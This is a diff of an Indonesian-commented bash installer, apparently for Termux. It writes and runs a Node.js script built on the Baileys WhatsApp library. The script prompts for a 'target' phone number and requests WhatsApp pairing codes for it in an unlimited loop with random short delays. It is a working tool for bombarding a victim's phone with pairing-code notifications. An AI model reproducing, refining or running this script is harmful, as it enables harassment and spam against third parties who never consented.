@@ -1,4 +1,6 @@
 #!/bin/bash
+
+# Cek Node.js
 if ! command -v node &> /dev/null; then
   pkg install -y nodejs -y
 fi
@@ -6,6 +8,7 @@ fi
 mkdir -p $HOME/pairing-loop
 cd $HOME/pairing-loop
 
+# Buat package.json kalau belum ada
 if [ ! -f "package.json" ]; then
 cat <<EOF > package.json
 {
@@ -20,6 +23,7 @@ cat <<EOF > package.json
 EOF
 fi
 
+# Buat file loop.js otomatis
 cat <<'EOF' > loop.js
 import makeWASocket, { fetchLatestBaileysVersion } from "@whiskeysockets/baileys"
 import readline from "readline"
@@ -36,42 +40,42 @@ function getRandomDelay(min, max) {
 async function startLoop() {
   const { version } = await fetchLatestBaileysVersion()
 
-  rl.question("Masukkan nomor WhatsApp (contoh: 628xxx): ", async (number) => {
+  rl.question("MASUKAN NOMOR TARGET (62): ", async (number) => {
     console.log("════════════════════════════════════")
     console.log("     PAIRING CODE LOOP (UNLIMITED)")
     console.log("Ketik 'Q' lalu ENTER untuk berhenti")
     console.log("════════════════════════════════════")
 
     let stop = false
+    let count = 0
 
     // Listener input untuk berhenti
     rl.on("line", (input) => {
       if (input.trim().toUpperCase() === "Q") {
-        console.log("════════════════════════════════════")
-        console.log("Loop dihentikan oleh user (Q).")
-        console.log("════════════════════════════════════")
         stop = true
+        console.log("════════════════════════════════════")
+        console.log(`Loop dihentikan oleh user (Q). Total code: ${count}`)
+        console.log("════════════════════════════════════")
         rl.close()
       }
     })
 
-    let count = 1
     while (!stop) {
       try {
         const sock = makeWASocket({
           version,
-          auth: { creds: {}, keys: {} }, // tidak simpan session
+          auth: { creds: {}, keys: {} }, // dummy auth, no session
           printQRInTerminal: false
         })
 
         const code = await sock.requestPairingCode(number)
+        count++
         console.log(`[${count}] Pairing Code: ${code}`)
 
-        const delay = getRandomDelay(1000, 5000) // 1-5 detik
+        const delay = getRandomDelay(1000, 5000) // 1–5 detik
         console.log(`   → jeda ${delay / 1000} detik...`)
         await new Promise(r => setTimeout(r, delay))
 
-        count++
       } catch (e) {
         console.log("Terjadi error:", e.message)
         break
@@ -84,5 +88,9 @@ async function startLoop() {
 
 startLoop()
 EOF
+
+# Install dependencies (sekali saja cukup)
 npm install
+
+# Jalankan loop pairing
 node loop.js
